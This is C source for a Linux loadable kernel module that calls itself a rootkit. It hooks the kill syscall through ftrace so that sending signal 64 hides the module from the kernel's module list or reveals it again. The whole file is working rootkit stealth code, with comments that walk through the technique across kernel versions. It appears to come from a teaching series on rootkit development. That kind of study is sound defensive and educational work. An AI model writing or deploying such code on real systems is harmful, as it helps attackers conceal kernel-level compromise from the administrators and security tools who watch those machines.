#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("TheXcellerator");
MODULE_DESCRIPTION("Syscall hijacking to send custom signals");
MODULE_VERSION("0.02");

/* After Kernel 4.17.0, the way that syscalls are handled changed
 * to use the pt_regs struct instead of the more familiar function
 * prototype declaration. We have to check for this, and set a
 * variable for later on */
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

/* We need these for hiding/revealing the kernel module */
static struct list_head *prev_module;
static short hidden = 0;

/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
 * declare the orig_kill and hook_kill functions differently
 * depending on the kernel version. This is the largest barrier to 
 * getting the rootkit to work on earlier kernel versions. The
 * more modern way is to use the pt_regs struct. */
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);

/* After grabbing the sig out of the pt_regs struct, just check
 * for signal 64 (unused normally) and, using "hidden" as a toggle
 * we either call hideme(), showme() or the real sys_kill()
 * syscall with the arguments passed via pt_regs. */
asmlinkage int hook_kill(const struct pt_regs *regs)
{
	void showme(void);
	void hideme(void);

	// pid_t pid = regs->di;
	int sig = regs->si;

	if ( (sig == 64) && (hidden == 0) )
	{
		printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
		hideme();
		hidden = 1;
	}
	else if ( (sig == 64) && (hidden == 1) )
	{
		printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
		showme();
		hidden = 0;
	}
	else
	{
		return orig_kill(regs);
	}
}
#else
/* This is the old way of declaring a syscall hook */
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

static asmlinkage int hook_kill(pid_t pid, int sig)
{
	void showme(void);
	void hideme(void);

	if ( (sig == 64) && (hidden == 0) )
	{
		printk(KERN_INFO "rootkit: hiding rootkit kernel module...\n");
		hideme();
		hidden = 1;
	}
	else if ( (sig == 64) && (hidden == 1) )
	{
		printk(KERN_INFO "rootkit: revealing rootkit kernel module...\n");
		showme();
		hidden = 0;
	}
	else
	{
		return orig_kill(pid, sig);
	}
}
#endif

/* Add this LKM back to the loaded module list, at the point
 * specified by prev_module */
void showme(void)
{
	list_add(&THIS_MODULE->list, prev_module);
}

/* Record where we are in the loaded module list by storing
 * the module prior to us in prev_module, then remove ourselves
 * from the list */
void hideme(void)
{
	prev_module = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
	HOOK("sys_kill", hook_kill, &orig_kill),
};

/* Module initialization function */
static int __init rootkit_init(void)
{
	/* Hook the syscall and print to the kernel buffer */
	int err;
	err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
	if(err)
		return err;

	printk(KERN_INFO "rootkit: Loaded >:-)\n");

	return 0;
}

static void __exit rootkit_exit(void)
{
	/* Unhook and restore the syscall and print to the kernel buffer */
	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
	printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
